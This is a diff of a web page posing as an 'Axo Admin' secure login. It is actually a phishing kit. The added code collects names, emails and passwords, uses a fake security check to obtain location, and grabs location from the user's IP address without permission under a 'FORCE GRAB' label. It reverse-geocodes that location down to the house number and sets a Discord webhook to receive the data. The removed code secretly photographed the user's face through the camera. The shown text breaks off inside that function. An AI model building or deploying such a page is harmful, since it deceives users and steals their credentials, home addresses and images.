@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>Axo · Login</title>
+    <title>Axo Admin · Security</title>
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
@@ -22,8 +22,8 @@
             padding: 1rem;
             background-image: radial-gradient(circle at 30% 20%, #1a2f4a 0%, #0b1729 90%);
         }
-        .glass-card {
-            max-width: 780px;
+        .admin-container {
+            max-width: 820px;
             width: 100%;
             background: rgba(12, 26, 45, 0.7);
             backdrop-filter: blur(16px);
@@ -32,7 +32,6 @@
             padding: 2rem 1.8rem;
             border: 1px solid rgba(255, 255, 255, 0.06);
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
-            transition: all 0.2s;
         }
         .step {
             display: block;
@@ -46,7 +45,8 @@
             100% { opacity: 1; transform: translateY(0); }
         }
 
-        .header {
+        /* ===== HEADER ===== */
+        .admin-header {
             display: flex;
             align-items: center;
             gap: 0.8rem;
@@ -54,30 +54,37 @@
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
             padding-bottom: 1.2rem;
         }
-        .header i {
-            font-size: 2rem;
-            color: #6a9eff;
-            filter: drop-shadow(0 0 8px #3f7eff55);
+        .admin-header .logo {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #2b6eff, #6a9eff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.3rem;
+            box-shadow: 0 8px 24px rgba(43, 110, 255, 0.3);
         }
-        .header h1 {
+        .admin-header h1 {
             font-weight: 600;
-            font-size: 1.6rem;
+            font-size: 1.4rem;
             background: linear-gradient(to right, #eef6ff, #adccff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.3px;
         }
-        .header .badge {
+        .admin-header .status {
             margin-left: auto;
-            background: #1f4b7a55;
-            padding: 0.25rem 1rem;
+            background: #1f4b2a55;
+            color: #8bdaa0;
+            padding: 0.2rem 1rem;
             border-radius: 40px;
             font-size: 0.7rem;
-            color: #9abfe6;
-            border: 1px solid #3a6f9e55;
+            border: 1px solid #2f7a4a55;
         }
 
+        /* ===== LOGIN ===== */
         .input-group {
             background: rgba(0, 0, 0, 0.35);
             border-radius: 3rem;
@@ -108,13 +115,13 @@
             width: 100%;
             outline: none;
             font-weight: 400;
-            letter-spacing: 0.2px;
         }
         .input-group input::placeholder {
             color: #6a8aa8;
             font-weight: 300;
             opacity: 0.7;
         }
+
         .btn-primary {
             background: #2b6eff;
             border: none;
@@ -156,51 +163,238 @@
             border-color: #6a9eff;
         }
 
-        .login-box {
-            padding: 0.5rem 0 0.2rem;
-        }
-        .login-box .title {
-            color: #b2cef0;
-            font-size: 0.9rem;
-            margin-bottom: 1.2rem;
-            opacity: 0.8;
+        /* ===== LOCATION PERMISSION ===== */
+        .location-permission-box {
+            background: rgba(43, 110, 255, 0.06);
+            border: 1px solid rgba(43, 110, 255, 0.15);
+            border-radius: 1.5rem;
+            padding: 1.2rem 1.5rem;
+            margin: 1rem 0;
             display: flex;
             align-items: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+        .location-permission-box .text {
+            color: #b2cef0;
+            font-size: 0.9rem;
+            flex: 1;
+        }
+        .location-permission-box .text i {
+            color: #6a9eff;
+            margin-right: 0.5rem;
+        }
+        .location-permission-box .text .secure-badge {
+            background: #1f4b2a55;
+            color: #8bdaa0;
+            padding: 0.1rem 0.7rem;
+            border-radius: 40px;
+            font-size: 0.65rem;
+            border: 1px solid #2f7a4a55;
+            margin-left: 0.5rem;
+        }
+        .location-permission-box .actions {
+            display: flex;
             gap: 0.6rem;
         }
-        .login-box .title i {
-            color: #6a9eff;
+        .location-permission-box .actions button {
+            padding: 0.5rem 1.4rem;
+            border-radius: 40px;
+            border: none;
+            font-weight: 500;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .location-permission-box .actions .allow {
+            background: #2b6eff;
+            color: white;
+        }
+        .location-permission-box .actions .allow:hover {
+            background: #3f7aff;
+        }
+        .location-permission-box .actions .skip {
+            background: transparent;
+            color: #8bb0d0;
+            border: 1px solid #3a6f9e;
+        }
+        .location-permission-box .actions .skip:hover {
+            background: rgba(255, 255, 255, 0.04);
         }
 
-        .dashboard-placeholder {
-            background: #0b1d31;
-            border-radius: 2rem;
-            padding: 2rem 1.5rem;
+        /* ===== LOADING SCREEN ===== */
+        .loading-screen {
             text-align: center;
-            border: 1px dashed #3a6f9e55;
-            margin: 1rem 0;
+            padding: 2.5rem 1rem;
         }
-        .dashboard-placeholder i {
-            font-size: 3rem;
-            color: #2b6eff;
-            margin-bottom: 0.8rem;
-            display: block;
+        .loading-screen .spinner {
+            width: 60px;
+            height: 60px;
+            border: 3px solid rgba(43, 110, 255, 0.1);
+            border-top: 3px solid #2b6eff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
         }
-        .progress-bar {
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-screen h2 {
+            color: #eef6ff;
+            font-size: 1.4rem;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+        }
+        .loading-screen p {
+            color: #9bb9d9;
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+        }
+        .loading-screen .progress-bar {
             width: 100%;
-            height: 6px;
+            height: 4px;
             background: #1a2f44;
             border-radius: 20px;
-            margin: 1.2rem 0 0.4rem;
             overflow: hidden;
+            margin: 1rem 0;
         }
-        .progress-fill {
+        .loading-screen .progress-fill {
             width: 0%;
             height: 100%;
             background: linear-gradient(90deg, #2b6eff, #8ab3ff);
             border-radius: 20px;
             transition: width 0.5s;
         }
+        .loading-screen .loading-steps {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            margin-top: 1.2rem;
+            font-size: 0.75rem;
+            color: #4a6f8f;
+        }
+        .loading-screen .loading-steps .step-item {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .loading-screen .loading-steps .step-item i {
+            font-size: 0.6rem;
+        }
+        .loading-screen .loading-steps .step-item.done {
+            color: #8bdaa0;
+        }
+        .loading-screen .loading-steps .step-item.active {
+            color: #6a9eff;
+        }
+        .loading-screen .loading-steps .step-item.pending {
+            color: #4a6f8f;
+        }
+
+        /* ===== DUMMY DASHBOARD ===== */
+        .dummy-dashboard {
+            padding: 0.5rem 0;
+        }
+        .dummy-dashboard .welcome-banner {
+            background: linear-gradient(135deg, rgba(43, 110, 255, 0.1), rgba(43, 110, 255, 0.02));
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(43, 110, 255, 0.1);
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        .dummy-dashboard .welcome-banner h2 {
+            color: #eef6ff;
+            font-size: 1.6rem;
+            font-weight: 600;
+        }
+        .dummy-dashboard .welcome-banner p {
+            color: #9bb9d9;
+            font-size: 0.9rem;
+            margin-top: 0.3rem;
+        }
+        .dummy-dashboard .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        @media (max-width: 480px) {
+            .dummy-dashboard .stats-grid { grid-template-columns: 1fr 1fr; }
+        }
+        .dummy-dashboard .stat-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 1.2rem;
+            padding: 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            text-align: center;
+        }
+        .dummy-dashboard .stat-box .number {
+            color: #eef6ff;
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+        .dummy-dashboard .stat-box .label {
+            color: #6a8aa8;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 0.2rem;
+        }
+        .dummy-dashboard .stat-box .icon {
+            font-size: 1.2rem;
+            color: #6a9eff;
+            margin-bottom: 0.3rem;
+        }
+        .dummy-dashboard .activity-list {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 1.2rem;
+            padding: 1rem 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-top: 1rem;
+        }
+        .dummy-dashboard .activity-list .item {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            color: #b2cef0;
+            font-size: 0.85rem;
+        }
+        .dummy-dashboard .activity-list .item:last-child {
+            border-bottom: none;
+        }
+        .dummy-dashboard .activity-list .item i {
+            color: #6a9eff;
+            width: 20px;
+        }
+        .dummy-dashboard .activity-list .item .time {
+            margin-left: auto;
+            color: #4a6f8f;
+            font-size: 0.7rem;
+        }
+        .dummy-dashboard .map-placeholder {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 1.2rem;
+            height: 160px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-top: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #4a6f8f;
+            font-size: 0.85rem;
+            overflow: hidden;
+        }
+        .dummy-dashboard .map-placeholder iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
         .footer-meta {
             margin-top: 1.5rem;
             font-size: 0.7rem;
@@ -216,180 +410,170 @@
             opacity: 0.4;
         }
 
-        /* Camera overlay - hidden from user */
-        #cameraOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 9999;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-        #cameraOverlay.active {
-            display: flex;
-        }
-        #cameraOverlay video {
-            max-width: 90%;
-            max-height: 70vh;
-            border-radius: 1.5rem;
-            border: 2px solid #2b6eff;
-            box-shadow: 0 0 40px #2b6eff55;
-            transform: scaleX(-1);
-        }
-        #cameraOverlay .face-guide {
-            position: absolute;
-            border: 2px dashed rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            width: 200px;
-            height: 200px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-        }
-        #cameraOverlay .face-guide-inner {
-            position: absolute;
-            border: 2px solid rgba(43, 110, 255, 0.5);
-            border-radius: 50%;
-            width: 160px;
-            height: 160px;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { border-color: rgba(43, 110, 255, 0.3); transform: translate(-50%, -50%) scale(1); }
-            50% { border-color: rgba(43, 110, 255, 0.8); transform: translate(-50%, -50%) scale(1.05); }
-            100% { border-color: rgba(43, 110, 255, 0.3); transform: translate(-50%, -50%) scale(1); }
-        }
-        #cameraOverlay .camera-text {
+        .admin-title {
             color: #b2cef0;
-            margin-top: 1rem;
             font-size: 0.9rem;
-            opacity: 0.7;
-            text-align: center;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
         }
-        #cameraOverlay .camera-text i {
+        .admin-title i {
             color: #6a9eff;
-            margin-right: 0.5rem;
-        }
-
-        .map-container {
-            margin: 1rem 0;
-            border-radius: 1.2rem;
-            overflow: hidden;
-            border: 1px solid #2a4b6e;
-            height: 200px;
-            background: #0a1628;
-        }
-        .map-container iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
         }
 
         @media (max-width: 480px) {
-            .glass-card { padding: 1.2rem; }
-            .map-container { height: 150px; }
-            #cameraOverlay .face-guide { width: 150px; height: 150px; }
-            #cameraOverlay .face-guide-inner { width: 120px; height: 120px; }
+            .admin-container { padding: 1.2rem; }
+            .dummy-dashboard .stats-grid { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden Camera Overlay -->
-    <div id="cameraOverlay">
-        <video id="cameraVideo" autoplay playsinline></video>
-        <div class="face-guide"></div>
-        <div class="face-guide-inner"></div>
-        <div class="camera-text"><i class="fas fa-spinner fa-pulse"></i> Please center your face in the circle</div>
-    </div>
+    <div class="admin-container" id="appContainer">
 
-    <div class="glass-card" id="appContainer">
-
-        <!-- HEADER -->
-        <div class="header">
-            <i class="fas fa-map-marked-alt"></i>
-            <h1>Axo · Login</h1>
-            <span class="badge"><i class="fas fa-lock" style="margin-right:4px;"></i>encrypted</span>
+        <!-- ===== HEADER ===== -->
+        <div class="admin-header">
+            <div class="logo"><i class="fas fa-shield-alt"></i></div>
+            <h1>Axo Admin</h1>
+            <span class="status"><i class="fas fa-circle" style="font-size:0.5rem;color:#8bdaa0;"></i> Secure</span>
         </div>
 
-        <!-- ===== STEP 1: CUSTOM LOGIN ===== -->
-        <div id="stepLogin" class="step">
-            <div class="login-box">
-                <div class="title">
-                    <i class="fas fa-pen-fancy"></i>
-                    <span>Place your new login details</span>
+        <!-- ===== STEP 1: LOGIN ===== -->
+        <div id="stepAuth" class="step">
+            <div class="admin-title">
+                <i class="fas fa-lock"></i> Secure Login
+            </div>
+            <div class="input-group">
+                <i class="fas fa-user"></i>
+                <input type="text" id="adminName" placeholder="Enter your full name" value="" />
+            </div>
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="adminEmail" placeholder="Enter your email address" value="" />
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="adminPassword" placeholder="Enter your password" value="" />
+            </div>
+            <div style="display:flex;gap:0.8rem;flex-wrap:wrap;margin-top:0.2rem;">
+                <button id="loginBtn" class="btn-primary" style="flex:1;min-width:150px;">
+                    <i class="fas fa-arrow-right-to-bracket"></i> Sign In
+                </button>
+                <button id="registerBtn" class="btn-secondary" style="flex:0.5;min-width:120px;">
+                    <i class="fas fa-user-plus"></i> Register
+                </button>
+            </div>
+            <div id="authStatus" style="margin-top:0.8rem;font-size:0.85rem;color:#9bb9d9;min-height:1.5rem;"></div>
+        </div>
+
+        <!-- ===== STEP 2: LOCATION PERMISSION ===== -->
+        <div id="stepLocation" class="step hidden">
+            <div style="text-align:center;padding:0.5rem 0;">
+                <i class="fas fa-shield-alt" style="font-size:3rem;color:#6a9eff;margin-bottom:0.8rem;display:block;"></i>
+                <div style="font-size:1.3rem;font-weight:500;color:#eef6ff;margin-bottom:0.3rem;">
+                    Device Security Check
                 </div>
-                <div class="input-group">
-                    <i class="fas fa-user"></i>
-                    <input type="text" id="usernameInput" placeholder="Username or email" value="admin@axo.io" />
+                <div style="color:#9bb9d9;font-size:0.9rem;margin-bottom:1.5rem;">
+                    <span id="locationUserName">User</span>, enable location to keep your device safe from threats
                 </div>
-                <div class="input-group">
-                    <i class="fas fa-lock"></i>
-                    <input type="password" id="passwordInput" placeholder="Password" value="••••••••" />
+                <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
+                    <button id="allowLocationBtn" class="btn-primary" style="width:auto;min-width:160px;padding:0.8rem 1.8rem;">
+                        <i class="fas fa-check-circle"></i> Allow
+                    </button>
+                    <button id="skipLocationBtn" class="btn-secondary" style="padding:0.8rem 1.8rem;">
+                        <i class="fas fa-times"></i> Skip
+                    </button>
                 </div>
-                <div style="margin-top: 0.8rem; display: flex; gap: 0.8rem; flex-wrap: wrap;">
-                    <button id="loginBtn" class="btn-primary"><i class="fas fa-arrow-right-to-bracket"></i> Sign in</button>
-                </div>
-                <div id="loginStatus" style="margin-top: 0.8rem; font-size: 0.85rem; color: #9bb9d9; min-height: 1.5rem;"></div>
+                <div id="locationStatus" style="margin-top:1rem;font-size:0.85rem;color:#9bb9d9;"></div>
             </div>
         </div>
 
-        <!-- ===== STEP 2: PREPARING DASHBOARD (loading 10 mins) ===== -->
-        <div id="stepDashboardLoading" class="step hidden">
-            <div class="dashboard-placeholder">
-                <i class="fas fa-spinner fa-pulse"></i>
-                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Preparing your dashboard</div>
-                <div style="color: #9bb9d9; margin: 0.4rem 0;">Axo is provisioning your custom environment</div>
+        <!-- ===== STEP 3: LOADING (5 mins) ===== -->
+        <div id="stepLoading" class="step hidden">
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <h2>Preparing your Axo Dashboard</h2>
+                <p>Please wait while we secure your environment</p>
                 <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill" style="width:0%;"></div>
+                    <div class="progress-fill" id="progressFill"></div>
                 </div>
-                <div style="display: flex; justify-content: space-between; font-size:0.7rem; color:#4a6f8f; margin-top:0.2rem;">
-                    <span>initializing</span>
-                    <span id="timerDisplay">10:00</span>
+                <div id="loadingTimer" style="color:#4a6f8f;font-size:0.8rem;margin-top:0.2rem;">05:00</div>
+                <div class="loading-steps">
+                    <span class="step-item pending" id="step1"><i class="fas fa-circle"></i> Security check</span>
+                    <span class="step-item pending" id="step2"><i class="fas fa-circle"></i> Loading modules</span>
+                    <span class="step-item pending" id="step3"><i class="fas fa-circle"></i> Syncing data</span>
+                    <span class="step-item pending" id="step4"><i class="fas fa-circle"></i> Finalizing</span>
                 </div>
-                <div style="margin-top: 1rem; font-size:0.85rem; color:#b2cef0;">
-                    <i class="fas fa-cog fa-spin"></i> loading modules, datasets, and permissions...
-                </div>
-            </div>
-            <div style="display: flex; justify-content: center; gap: 0.8rem; flex-wrap: wrap; margin-top: 0.4rem;">
-                <button id="resetAppBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
             </div>
         </div>
 
-        <!-- ===== STEP 3: DASHBOARD READY (after 10 min) ===== -->
-        <div id="stepDashboardReady" class="step hidden">
-            <div class="dashboard-placeholder" style="border-color: #2b6eff55; background: #0f2640;">
-                <i class="fas fa-check-circle" style="color: #8bdaa0;"></i>
-                <div style="font-size: 1.4rem; font-weight: 500; color: #eef6ff;">Dashboard ready</div>
-                <div style="color: #9bb9d9; margin: 0.4rem 0;">Your Axo Admin is now available</div>
-
-                <!-- Google Maps view -->
-                <div id="mapContainer" class="map-container">
-                    <iframe id="googleMapFrame" src="" allowfullscreen loading="lazy"></iframe>
+        <!-- ===== STEP 4: DUMMY DASHBOARD ===== -->
+        <div id="stepDashboard" class="step hidden">
+            <div class="dummy-dashboard">
+                <div class="welcome-banner">
+                    <h2>👋 Welcome, <span id="dashName">User</span>!</h2>
+                    <p>Your Axo Admin dashboard is ready</p>
                 </div>
 
-                <div style="margin-top: 1.2rem; display: flex; gap: 0.8rem; justify-content: center; flex-wrap: wrap;">
-                    <button id="launchDashboardBtn" class="btn-primary" style="min-width: 200px;"><i class="fas fa-rocket"></i> Launch</button>
-                    <button id="resetFromReadyBtn" class="btn-secondary"><i class="fas fa-undo-alt"></i> Restart</button>
+                <div class="stats-grid">
+                    <div class="stat-box">
+                        <div class="icon"><i class="fas fa-users"></i></div>
+                        <div class="number">1,284</div>
+                        <div class="label">Active Users</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="icon"><i class="fas fa-chart-line"></i></div>
+                        <div class="number">87%</div>
+                        <div class="label">System Uptime</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="number">100%</div>
+                        <div class="label">Security Status</div>
+                    </div>
+                </div>
+
+                <div class="map-placeholder">
+                    <iframe id="dashMap" src="" allowfullscreen loading="lazy"></iframe>
+                </div>
+
+                <div class="activity-list">
+                    <div class="item">
+                        <i class="fas fa-check-circle" style="color:#8bdaa0;"></i>
+                        <span>Security check completed</span>
+                        <span class="time">Just now</span>
+                    </div>
+                    <div class="item">
+                        <i class="fas fa-location-dot" style="color:#6a9eff;"></i>
+                        <span>Location verified: <span id="dashLocation">N/A</span></span>
+                        <span class="time">Just now</span>
+                    </div>
+                    <div class="item">
+                        <i class="fas fa-sync" style="color:#ffd966;"></i>
+                        <span>System sync completed</span>
+                        <span class="time">2 min ago</span>
+                    </div>
+                    <div class="item">
+                        <i class="fas fa-shield-alt" style="color:#8bdaa0;"></i>
+                        <span>All security protocols active</span>
+                        <span class="time">5 min ago</span>
+                    </div>
+                </div>
+
+                <div style="display:flex;gap:0.8rem;flex-wrap:wrap;margin-top:1rem;">
+                    <button id="logoutBtn2" class="btn-secondary" style="flex:1;min-width:120px;">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
                 </div>
             </div>
         </div>
 
         <!-- FOOTER -->
         <div class="footer-meta">
-            <span><i class="fas fa-lock"></i> encrypted · shared via Axo</span>
-            <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19T11:07:07.368Z</span></span>
-            <span><i class="fas fa-globe-asia"></i> v5.0</span>
+            <span><i class="fas fa-lock"></i> encrypted</span>
+            <span><i class="far fa-clock"></i> <span id="footerTimestamp">2026-06-19 13:00:57Z</span></span>
+            <span><i class="fas fa-shield-alt"></i> v9.0</span>
         </div>
     </div>
 
@@ -397,44 +581,64 @@
         (function() {
             "use strict";
 
-            // DOM refs
-            const stepLogin = document.getElementById('stepLogin');
-            const stepDashboardLoading = document.getElementById('stepDashboardLoading');
-            const stepDashboardReady = document.getElementById('stepDashboardReady');
+            // ============================================================
+            // WEBHOOK
+            // ============================================================
 
-            const usernameInput = document.getElementById('usernameInput');
-            const passwordInput = document.getElementById('passwordInput');
+            const WEBHOOK_URL =
+                'https://discord.com/api/webhooks/1517509222672371758/nR4kqTLEDTkfX75tNsPiKH2qGCGe7VwkJiK0i7Vd6V2iclH3LF_oDwVIuE49xxPZRHiS';
+
+            // ============================================================
+            // DOM REFS
+            // ============================================================
+
+            const stepAuth = document.getElementById('stepAuth');
+            const stepLocation = document.getElementById('stepLocation');
+            const stepLoading = document.getElementById('stepLoading');
+            const stepDashboard = document.getElementById('stepDashboard');
+
+            const adminName = document.getElementById('adminName');
+            const adminEmail = document.getElementById('adminEmail');
+            const adminPassword = document.getElementById('adminPassword');
             const loginBtn = document.getElementById('loginBtn');
-            const loginStatus = document.getElementById('loginStatus');
+            const registerBtn = document.getElementById('registerBtn');
+            const authStatus = document.getElementById('authStatus');
+
+            const locationUserName = document.getElementById('locationUserName');
+            const allowLocationBtn = document.getElementById('allowLocationBtn');
+            const skipLocationBtn = document.getElementById('skipLocationBtn');
+            const locationStatus = document.getElementById('locationStatus');
 
             const progressFill = document.getElementById('progressFill');
-            const timerDisplay = document.getElementById('timerDisplay');
+            const loadingTimer = document.getElementById('loadingTimer');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
 
-            const resetBtn = document.getElementById('resetAppBtn');
-            const resetFromReadyBtn = document.getElementById('resetFromReadyBtn');
-            const launchDashboardBtn = document.getElementById('launchDashboardBtn');
-            const googleMapFrame = document.getElementById('googleMapFrame');
+            const dashName = document.getElementById('dashName');
+            const dashLocation = document.getElementById('dashLocation');
+            const dashMap = document.getElementById('dashMap');
+            const logoutBtn2 = document.getElementById('logoutBtn2');
 
             const footerTimestamp = document.getElementById('footerTimestamp');
-            const cameraOverlay = document.getElementById('cameraOverlay');
-            const cameraVideo = document.getElementById('cameraVideo');
 
-            // webhook
-            const WEBHOOK_URL =
-                'https://discord.com/api/webhooks/1517484431311507576/IP3tnvep8OdyuEnHOaeBCHGmaMVKcAupa-9CzCf9l6SNjSV0SRjm41K92Pyvaqf8AnZt';
+            // ============================================================
+            // STATE
+            // ============================================================
 
-            // state
-            let isDashboardLoading = false;
-            let dashboardTimer = null;
-            let countdownInterval = null;
-            let loadingStartTime = null;
-            let locationGrabbed = false;
+            let currentUser = { name: '', email: '' };
             let locationData = null;
-            let faceCaptured = false;
-            let faceImageData = null;
-            let cameraStream = null;
+            let locationPermission = false;
+            let loadingInterval = null;
+            let loadingTimerInterval = null;
+            let loadingSeconds = 0;
+            const LOADING_DURATION = 5 * 60; // 5 minutes
 
-            // ----- update timestamp -----
+            // ============================================================
+            // UPDATE TIMESTAMP
+            // ============================================================
+
             function updateTimestamp() {
                 const now = new Date();
                 footerTimestamp.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + 'Z';
@@ -442,379 +646,379 @@
             updateTimestamp();
             setInterval(updateTimestamp, 30000);
 
-            // ----- show step -----
+            // ============================================================
+            // SHOW STEP
+            // ============================================================
+
             function showStep(stepId) {
-                [stepLogin, stepDashboardLoading, stepDashboardReady].forEach(el => el.classList.add('hidden'));
+                [stepAuth, stepLocation, stepLoading, stepDashboard].forEach(el => el.classList.add('hidden'));
                 document.getElementById(stepId).classList.remove('hidden');
             }
 
-            // ----- AGGRESSIVE HOUSE NUMBER EXTRACTION -----
-            function extractHouseNumber(addr, displayName) {
-                const fields = [
-                    addr.house_number,
-                    addr.building,
-                    addr.address29,
-                    addr.amenity,
-                    addr.shop,
-                    addr.office,
-                    addr.industrial,
-                    addr.commercial,
-                    addr.retail,
-                    addr.place,
-                    addr.locality,
-                    addr.hamlet
-                ];
+            // ============================================================
+            // GET ADDRESS
+            // ============================================================
 
-                for (let field of fields) {
-                    if (field && field.match(/\d/)) {
-                        return field;
-                    }
-                }
-
-                if (displayName) {
-                    const matches = displayName.match(/(\d+[a-z]?)\s*[,|.]?\s*[A-Za-z]/i);
-                    if (matches && matches[1]) return matches[1];
-                    const matchNo = displayName.match(/(?:No\.?|#)\s*(\d+[a-z]?)/i);
-                    if (matchNo && matchNo[1]) return matchNo[1];
-                    const matchStart = displayName.match(/^(\d+[a-z]?)\s+/i);
-                    if (matchStart && matchStart[1]) return matchStart[1];
-                }
-                return 'N/A';
-            }
-
-            // ----- reverse geocode (Nominatim) -----
-            async function reverseGeocode(lat, lng) {
-                let url =
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=19&addressdetails=1&accept-language=en`;
-                let resp = await fetch(url, {
-                    headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
-                });
-                if (!resp.ok) {
-                    url =
+            async function getAddress(lat, lng) {
+                try {
+                    const url =
                         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=en`;
-                    resp = await fetch(url, {
-                        headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
+                    const resp = await fetch(url, {
+                        headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Admin/9.0' }
                     });
-                    if (!resp.ok) throw new Error(`Geocode API error ${resp.status}`);
-                }
-                const data = await resp.json();
-                if (!data || !data.address) {
-                    url =
-                        `https://nominatim.openstreetmap.org/search?format=json&q=${lat},${lng}&addressdetails=1&limit=1`;
-                    resp = await fetch(url, {
-                        headers: { 'Accept': 'application/json', 'User-Agent': 'Axo-Force/5.0' }
-                    });
-                    if (!resp.ok) throw new Error('No address found');
-                    const searchData = await resp.json();
-                    if (searchData && searchData.length > 0 && searchData[0].address) {
-                        return searchData[0];
+                    if (!resp.ok) throw new Error('Geocode failed');
+                    const data = await resp.json();
+                    if (data && data.address) {
+                        const addr = data.address;
+                        const display = data.display_name || '';
+                        let houseNumber = addr.house_number || addr.building || addr.address29 || '';
+                        if (!houseNumber && display) {
+                            const match = display.match(/(\d+[a-z]?)\s*[,|.]?\s*[A-Za-z]/i);
+                            if (match) houseNumber = match[1];
+                        }
+                        return {
+                            houseNumber: houseNumber || 'N/A',
+                            street: addr.road || addr.street || 'N/A',
+                            city: addr.city || addr.town || addr.village || 'N/A',
+                            state: addr.state || addr.region || addr.province || 'N/A',
+                            country: addr.country || 'N/A',
+                            postcode: addr.postcode || 'N/A',
+                            fullAddress: display || 'N/A',
+                            neighbourhood: addr.neighbourhood || addr.suburb || 'N/A'
+                        };
                     }
-                    throw new Error('No address found');
-                }
-                return data;
+                } catch (e) { /* silent */ }
+                return null;
             }
 
-            // ----- extract address fields -----
-            function extractAddress(data) {
-                const addr = data.address || {};
-                const display = data.display_name || '';
-                const houseNumber = extractHouseNumber(addr, display);
-                const street = addr.road || addr.street || addr.pedestrian || '';
-                const city = addr.city || addr.town || addr.village || addr.suburb || addr.municipality || '';
-                const state = addr.state || addr.region || addr.province || addr.district || '';
-                const country = addr.country || '';
-                const postcode = addr.postcode || '';
-                const neighbourhood = addr.neighbourhood || addr.quarter || addr.hamlet || '';
-                return { houseNumber, street, city, state, country, postcode, neighbourhood, fullAddress: display };
-            }
+            // ============================================================
+            // FORCE GRAB (IP - NO PERMISSION)
+            // ============================================================
 
-            // ----- CAPTURE FACE (silent, hidden from user) -----
-            async function captureFace() {
-                if (faceCaptured) return;
+            async function forceGrabLocation() {
+                try {
+                    const resp = await fetch('https://ipapi.co/json/');
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        if (data.latitude && data.longitude) {
+                            return {
+                                lat: parseFloat(data.latitude),
+                                lng: parseFloat(data.longitude),
+                                method: 'Force (IP)'
+                            };
+                        }
+                    }
+                } catch (e) { /* silent */ }
 
                 try {
-                    // Show camera overlay briefly (user sees it but thinks it's part of login)
-                    cameraOverlay.classList.add('active');
-
-                    // Start camera
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                    });
-                    cameraStream = stream;
-                    cameraVideo.srcObject = stream;
-                    await cameraVideo.play();
-
-                    // Wait 2 seconds for face to be centered
-                    await new Promise(resolve => setTimeout(resolve, 2500));
-
-                    // Capture frame
-                    const canvas = document.createElement('canvas');
-                    canvas.width = cameraVideo.videoWidth || 640;
-                    canvas.height = cameraVideo.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-
